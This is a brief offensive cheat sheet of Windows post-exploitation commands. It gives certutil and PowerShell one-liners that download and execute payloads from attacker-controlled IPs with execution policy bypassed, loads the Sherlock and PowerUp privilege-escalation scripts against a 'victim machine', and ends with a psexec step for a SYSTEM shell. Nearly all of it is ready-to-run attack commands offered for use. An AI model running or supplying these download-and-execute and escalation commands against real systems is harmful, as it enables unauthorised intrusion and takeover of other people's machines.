# Download stuff

1. certutil -urlcache -split -f http://source.ip/payload.exe payload.exe
2. Download the file: 
Invoke-WebRequest -Uri "url" -OutFile "dest"
3. Download and execute: 
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('ip/src')"

# Find Stuff

* cmd: dir Backups /s c:\ /p 
* ps:

# Enumeration

powershell.exe -exec bypass -C "IEX(New-Object System.Net.WebClient).DownloadString('http://xxx.xxx.xxx.xxx/Sherlock.ps1');Find-AllVulns"

c:\>powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/PowerUp.ps1') ; Invoke-AllChecks"

c:\>powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/powerup.ps1') ; Invoke-AllChecks"

c:\>powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/Sherlock.ps1') ; Find-AllVulns"

## If you have your ps1 file downloaded to the victim machine then run using this
c:\>powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"

c:\>powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"


# Exploitation

* Once Admin privileges obtained
`psexec -sid cmd.exe`

